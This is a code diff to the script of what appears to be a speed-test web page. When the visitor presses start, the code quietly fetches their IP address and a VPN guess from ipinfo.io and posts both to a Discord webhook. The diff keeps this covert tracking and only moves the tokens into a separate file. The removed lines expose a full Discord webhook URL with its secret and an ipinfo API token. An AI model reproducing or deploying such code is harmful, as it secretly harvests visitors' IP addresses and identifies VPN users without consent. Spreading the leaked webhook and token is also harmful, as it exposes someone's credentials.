@@ -1,18 +1,27 @@
-document.getElementById("startBtn").addEventListener("click", () => {
+let ipinfoToken = "";
+let discordWebhook = "";
+
+async function loadTokens() {
+  const response = await fetch("tokens.json");
+  const tokens = await response.json();
+  ipinfoToken = tokens.ipinfoToken;
+  discordWebhook = tokens.discordWebhook;
+}
+
+document.getElementById("startBtn").addEventListener("click", async () => {
+  await loadTokens();
   sendIPToDiscord();
   runSpeedTest();
 });
 
 async function sendIPToDiscord() {
   try {
-    const response = await fetch('https://ipinfo.io/json?token=33af25a0f9774c');
+    const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
     const data = await response.json();
 
     const userIP = data.ip || "Unknown IP";
-    const vpnDetected = (data.org && data.org.toLowerCase().includes("vpn")) || 
+    const vpnDetected = (data.org && data.org.toLowerCase().includes("vpn")) ||
                         (data.hostname && data.hostname.toLowerCase().includes("vpn")) ? "Yes" : "No";
-
-    const webhookURL = "https://discord.com/api/webhooks/1373374311632736469/8hQz2YjDv_PC5A_pMEGz74FpFsmdUm-04UTJ26O8t3Rq6hYxSK_qXEDqPDEO85yZbY5H";
 
     const content = `
 🚨 User IP detected: \`${userIP}\`
@@ -23,7 +32,7 @@ async function sendIPToDiscord() {
 
     const payload = { content };
 
-    await fetch(webhookURL, {
+    await fetch(discordWebhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
